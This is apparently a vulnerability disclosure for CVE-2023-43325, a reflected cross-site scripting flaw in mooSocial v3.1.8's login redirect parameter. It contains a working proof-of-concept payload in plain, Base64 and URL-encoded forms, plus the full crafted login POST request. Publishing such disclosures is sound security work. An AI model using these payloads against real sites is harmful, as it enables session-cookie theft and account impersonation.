# mooSocial: XSS (CVE-2023-43325)
A reflected cross-site scripting (XSS) vulnerability exisits in the data[redirect_url] parameter on user login function of mooSocial v3.1.8 which allows attackers to steal user's session cookies and impersonate their account via a crafted URL.

Vulerable Parameter: **data[redirect_url]**

## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)
```
Payload : test"><img src=a onerror=alert(1)>test 
Payload (Base64 encoded) : dGVzdCI+PGltZyBzcmM9YSBvbmVycm9yPWFsZXJ0KDEpPnRlc3Q=
Final Payload (Base64+Url encoded): dGVzdCI%2bPGltZyBzcmM9YSBvbmVycm9yPWFsZXJ0KDEpPnRlc3Q%3d%3d
```
POST Request on /moosocial/users/login (POST REQUEST DATA ONLY): 
```
[_method=POST&data%5Bredirect_url%5D=dGVzdCI%2bPGltZyBzcmM9YSBvbmVycm9yPWFsZXJ0KDEpPnRlc3Q%3d%3d&data%5BUser%5D%5Bid%5D=&data%5BUser%5D%5Bemail%5D=admin%40localhost.com&data%5BUser%5D%5Bpassword%5D=pas[redacted]&data%5Bremember%5D=0]
```

### Screenshot
![image](https://github.com/ahrixia/CVE-2023-43325/assets/35935843/b6b8b968-e0b5-4e70-8285-4e0abbfe8f3b)
